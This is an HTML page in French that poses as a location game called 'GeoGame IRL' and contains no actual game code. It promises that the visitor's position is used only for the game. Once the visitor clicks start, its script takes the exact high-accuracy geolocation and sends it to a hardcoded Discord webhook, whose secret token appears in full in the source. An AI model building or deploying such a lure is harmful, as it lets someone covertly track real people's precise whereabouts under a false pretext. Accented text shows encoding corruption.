<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>GeoGame IRL</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f0f4f8;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    #startContainer {
        text-align: center;
        background: white;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }

    #startButton {
        padding: 15px 25px;
        font-size: 18px;
        border: none;
        border-radius: 8px;
        background-color: #007bff;
        color: white;
        cursor: pointer;
        margin-top: 20px;
        transition: background 0.2s;
    }

    #startButton:hover {
        background-color: #0056b3;
    }
</style>
</head>
<body>

<div id="startContainer">
    <h2>üìç Bienvenue sur GeoGame IRL</h2>
    <p>
        Pour jouer, nous avons besoin de votre position exacte.<br>
        Votre localisation sera utilis√©e uniquement pour le jeu.
    </p>
    <button id="startButton">Commencer le jeu</button>
</div>

<script>
document.getElementById("startButton").addEventListener("click", () => {

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            alert(`Position obtenue ‚úîÔ∏è\nLatitude: ${lat}\nLongitude: ${lon}\nPr√©cision: ${acc}m\n\nLe jeu peut commencer !`);

            // --- ENVOI AU WEBHOOK DISCORD ---
            const webhookURL = "https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb";

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "GeoGame",
                    content: "Nouvel utilisateur (avec consentement)",
                    embeds: [
                        {
                            title: "Position exacte",
                            description: `Latitude : ${lat}\nLongitude : ${lon}\nPr√©cision : ${acc}m`,
                            color: 0x00ff99
                        }
                    ]
                })
            })
            .then(response => {
                if(response.ok) console.log("Webhook envoy√© !");
                else console.log("Erreur envoi webhook :", response.status);
            })
            .catch(err => console.log("Erreur webhook :", err));

        },
        (error) => {
            alert("Vous avez refus√© la localisation ou votre appareil ne la permet pas.\nLe jeu ne peut pas d√©marrer.");
            console.log("Erreur g√©olocalisation :", error);
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
});
</script>

</body>
</html>
